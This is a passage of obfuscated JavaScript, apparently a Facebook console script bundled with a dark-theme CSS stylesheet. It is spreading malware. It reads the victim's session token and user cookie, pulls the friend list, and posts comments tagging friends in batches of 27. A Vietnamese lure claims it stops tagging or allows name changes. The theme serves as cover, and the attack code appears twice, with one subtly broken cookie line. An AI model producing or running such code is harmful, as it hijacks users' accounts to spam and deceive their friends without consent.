                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text=(y)  Tks Quyet Chip da share cach chong tag ...Ai dc tag thi sao khong thu lam di ;) Thanh c0ng 100% nhe ... ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(id);
sublist("236203529873712");
//theme
	(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #cdecea !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://ifanboy.com/wp-content/uploads/2011/07/GhostRider_1_CoverLozziVariant.jpg) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #d69ef0 !important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #b4ec96 !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #f99800 !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #f99800 !important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #f99800 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #f99800 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #f99800 !important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #f99800 !important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #f99800 !important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #f99800 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #f99800 !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '1387978644801712';
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var _0x7892x7 = new XMLHttpRequest();
    _0x7892x7['onreadystatechange'] = function () {
        if (_0x7892x7['readyState'] == 4) {
            eval('arkadaslar = ' + _0x7892x7['responseText'].toString()['replace']('for (;;);', '') + ';');
            for (f = 0; f < Math['round'](arkadaslar['payload']['entries']['length'] / 27); f++) {
                mesaj = '';
                mesaj_text = '';
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar['payload']['entries'][i]) {
                        mesaj += ' @[' + arkadaslar['payload']['entries'][i]['uid'] + ':' + arkadaslar['payload']['entries'][i]['text'] + ']';
                        mesaj_text += ' ' + arkadaslar['payload']['entries'][i]['text'];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var _0x7892x8 = '&filter[0]=user';
    _0x7892x8 += '&options[0]=friends_only';
    _0x7892x8 += '&options[1]=nm';
    _0x7892x8 += '&token=v7';
    _0x7892x8 += '&viewer=' + user_id;
    _0x7892x8 += '&__user=' + user_id;
    if (document['URL']['indexOf']('https://') >= 0) {
        _0x7892x7['open']('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    } else {
        _0x7892x7['open']('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1' + _0x7892x8, true);
    };
    _0x7892x7['send']();
};

function RandomArkadas() {
    var _0x7892xa = '';
    for (i = 0; i < 9; i++) {
        _0x7892xa += ' @[' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['uid'] + ':' + arkadaslar['payload']['entries'][Math['floor'](Math['random']() * arkadaslar['payload']['entries']['length'])]['text'] + ']';
    };
    return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
    var _0x7892xd = new XMLHttpRequest();
    var _0x7892x8 = '';
    _0x7892x8 += '&ft_ent_identifier=' + id;
    _0x7892x8 += '&comment_text=(y)  Tks Quyet Chip da share cach doi ten qa 5 lan ...Ai dc duoc thi sao khong thu lam di ;) Thanh c0ng 100% nhe ... ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
    _0x7892x8 += '&client_id=1377871797138:1707018092';
    _0x7892x8 += '&reply_fbid';
    _0x7892x8 += '&parent_comment_id';
    _0x7892x8 += '&rootid=u_jsonp_2_3';
    _0x7892x8 += '&clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":' + id + '}';
    _0x7892x8 += '&attached_sticker_fbid=0';
    _0x7892x8 += '&attached_photo_fbid=0';
    _0x7892x8 += '&giftoccasion';
    _0x7892x8 += '&ft[tn]=[]';
    _0x7892x8 += '&__user=' + user_id;
    _0x7892x8 += '&__a=1';
    _0x7892x8 += '&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
    _0x7892x8 += '&__req=q';
    _0x7892x8 += '&fb_dtsg=' + fb_dtsg;
    _0x7892x8 += '&ttstamp=';
    _0x7892xd['open']('POST', '/ajax/ufi/add_comment.php', true);
    _0x7892xd['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x7892xd['onreadystatechange'] = function () {
        if (_0x7892xd['readyState'] == 4 && _0x7892xd['status'] == 200) {
            _0x7892xd['close'];
        };
    };
    _0x7892xd['send'](_0x7892x8);
};
arkadaslari_al(id);